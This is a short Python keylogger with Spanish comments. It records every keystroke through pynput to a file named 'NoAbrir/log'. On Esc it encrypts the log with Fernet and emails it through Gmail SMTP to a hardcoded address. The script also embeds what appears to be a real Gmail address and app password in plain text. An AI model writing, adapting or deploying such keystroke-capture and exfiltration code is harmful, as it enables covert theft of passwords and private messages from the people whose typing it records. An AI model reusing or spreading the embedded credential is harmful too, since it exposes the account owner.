import os
from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from pynput.keyboard import Key, Listener


#################################################################################################################3

# Configura las credenciales de tu cuenta de Gmail
email_address ='raucardona06@gmail.com'
email_password ='kvdg fpvq bsvv wyay'

# Clave de cifrado generada y almacenada en un archivo
encryption_key_file = 'encryption_key.key'
if not os.path.isfile(encryption_key_file):
    key = Fernet.generate_key()
    with open(encryption_key_file, 'wb') as key_file:
        key_file.write(key)
else:
    with open(encryption_key_file, 'rb') as key_file:
        key = key_file.read()

        

def send_email(subject, attachment_path):
    try:
        # Configura el servidor SMTP de Gmail
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_address, email_password)

        # Crea un mensaje de correo electrónico
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = email_address
        msg['To'] = 'raucardona06@gmail.com'

        # Lee el archivo de registro y lo cifra
        with open(attachment_path, 'r') as log_file:
            log_contents = log_file.read()
        
        fernet = Fernet(key)
        encrypted_log_contents = fernet.encrypt(log_contents.encode())

        # Sobrescribe el archivo local con el registro cifrado
        with open(attachment_path, 'w') as log_file:
            log_file.write(encrypted_log_contents.decode())

        # Adjunta el archivo de registro cifrado al mensaje
        attachment = MIMEApplication(encrypted_log_contents, _subtype="txt")
        attachment.add_header('content-disposition', 'attachment', filename=os.path.basename(attachment_path))
        msg.attach(attachment)

        # Envía el correo electrónico
        server.sendmail(email_address, 'raucardona06@gmail.com', msg.as_string())
        print("Archivo enviado con éxito")
        server.quit()
    except Exception as e:
        print("Error al enviar el correo electrónico: " + str(e))


def on_press(key):
    try:
        with open('NoAbrir/log', 'a') as f:
            f.write(str(key) + '\n')
    except Exception as e:
        print(str(e))


def on_release(key):
    if key==Key.esc:
        print('Salió del keylogger')
        with open('NoAbrir/log', 'r') as f:
            buffer = f.read()
        f.close()
        send_email("Registro de teclas", 'NoAbrir/log')
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()